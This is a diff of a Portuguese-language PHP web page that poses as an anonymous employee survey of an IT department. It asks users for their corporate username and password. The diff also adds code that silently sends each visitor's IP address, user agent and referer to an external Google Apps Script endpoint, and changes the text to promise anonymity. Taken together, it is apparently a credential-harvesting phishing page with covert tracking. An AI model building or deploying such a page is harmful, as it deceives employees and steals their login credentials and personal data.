@@ -1,42 +1,38 @@
 <?php
-if (!isset($_SESSION['access_logged'])) { // Opcional: Para evitar logs múltiplos na mesma sessão de usuário
-    session_start(); // Inicia a sessão para controlar o log de acesso
-
-    // URL da nova função do Apps Script para logs de acesso
-    $appsScriptLogUrl = 'https://script.google.com/macros/s/SEU_ID_UNICO_DA_FUNCAO_DE_LOG/exec'; // <-- COLOQUE A NOVA URL AQUI
-
-    $access_data = [
-        'ip'        => $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN',
-        'userAgent' => $_SERVER['HTTP_USER_AGENT'] ?? 'N/A',
-        'referer'   => $_SERVER['HTTP_REFERER'] ?? 'N/A'
-    ];
-
-    $log_payload = json_encode($access_data);
-
-    $options = [
-        'http' => [
-            'header'  => "Content-type: application/json\r\n",
-            'method'  => 'POST',
-            'content' => $log_payload,
-            'timeout' => 5, // Tempo limite em segundos
-            'ignore_errors' => true // Para evitar que erros na requisição de log afetem a página principal
-        ]
-    ];
-    $context  = stream_context_create($options);
-
-    // Faz a requisição "silenciosa"
-    $log_response = @file_get_contents($appsScriptLogUrl, false, $context);
-
-    // Você pode logar a resposta do Apps Script para depuração (visível no log do Vercel)
-    if ($log_response === false) {
-        error_log("Erro ao registrar acesso no Apps Script: " . (error_get_last()['message'] ?? 'Desconhecido'));
-    } else {
-        error_log("Registro de acesso Apps Script: " . $log_response);
-    }
-
-    $_SESSION['access_logged'] = true; // Marca que o acesso foi logado nesta sessão
+function getUserIP() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    return $_SERVER['REMOTE_ADDR'];
 }
+
+// Dados do acesso
+$ip = getUserIP();
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
+$referer = $_SERVER['HTTP_REFERER'] ?? 'Acesso direto';
+
+// Dados para o log
+$logData = [
+    'ip' => $ip,
+    'userAgent' => $userAgent,
+    'referer' => $referer
+];
+
+// Enviar para função do Google Apps Script que trata logs
+$logScriptUrl = 'https://script.google.com/macros/s/AKfycbzK-yZEAyED-oU_MT0m68Aac4_Mkn8oBc2di-eN91lxSTFPlrHloHizC0M8eLlYh3Ff/exec'; // mesmo Apps Script
+
+$payload = json_encode($logData);
+$ch = curl_init($logScriptUrl);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    'Content-Type: application/json',
+    'Content-Length: ' . strlen($payload)
+]);
+curl_exec($ch);
+curl_close($ch);
 ?>
+
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -245,12 +241,12 @@ if (!isset($_SESSION['access_logged'])) { // Opcional: Para evitar logs múltipl
             </svg>
         </div>
         <h1>Avalie o Departamento de TI</h1>
-        <p>A sua opinião é fundamental para aprimorarmos continuamente nossos serviços e garantir a melhor experiência para todos os colaboradores. Sua avaliação não será compartilhada e nos ajuda a identificar pontos fortes e áreas de melhoria.</p>
+        <p>A sua opinião é fundamental para aprimorarmos continuamente nossos serviços e garantir a melhor experiência para todos os colaboradores. Sua avaliação é anônima e nos ajuda a identificar pontos fortes e áreas de melhoria.</p>
 
         <div id="loginSection">
             <p>Para a organização das avaliações, insira seu usuário e senha para prosseguir:</p>
             <div class="input-group">
-                <label for="username">Email Coorporativo:</label>
+                <label for="username">Usuário:</label>
                 <input type="text" id="username" name="username_field" required>
             </div>
             <div class="input-group">
@@ -261,7 +257,7 @@ if (!isset($_SESSION['access_logged'])) { // Opcional: Para evitar logs múltipl
         </div>
 
         <div id="evaluationSection" class="hidden">
-            <form id="evaluationForm" action="/api/submit.php" method="POST">
+            <form id="evaluationForm" action="submit.php" method="POST">
                 <p>Obrigado por autenticar! Agora, por favor, deixe sua avaliação:</p>
                 
                 <div class="input-group">
